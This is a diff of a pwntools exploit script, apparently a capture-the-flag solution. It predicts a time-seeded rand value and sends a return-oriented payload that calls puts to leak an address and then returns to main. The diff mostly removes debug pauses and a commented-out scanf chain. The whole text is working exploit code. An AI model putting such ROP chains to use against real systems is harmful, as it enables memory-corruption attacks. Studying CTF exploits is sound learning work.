@@ -25,8 +25,6 @@ def main():
     r = conn()
     
     libc.srand(libc.time(0))
-    
-    #pause()
 
     s = libc.rand()
     rand = str(s).encode()
@@ -41,14 +39,8 @@ def main():
     payload += p64(pop_rdi)
     payload += p64(0x404030)
     payload += p64(exe.symbols.puts)
-    
     payload += p64(exe.symbols.main)
-    """payload += p64(pop_rsi)
-    payload += p64(writeable)
-    payload += p64(0)
-    payload += p64(pop_rdi) + p64(0x402049) # %s
-    payload += p64(0x4011b0) # scanf"""
-    
+
     r.sendline(payload)
     
     r.recvuntil(b'he mind games!\n')
@@ -59,7 +51,6 @@ def main():
     
     libc.srand(libc.time(0))
     
-    pause()
     s = libc.rand()
     rand = str(s).encode()
     
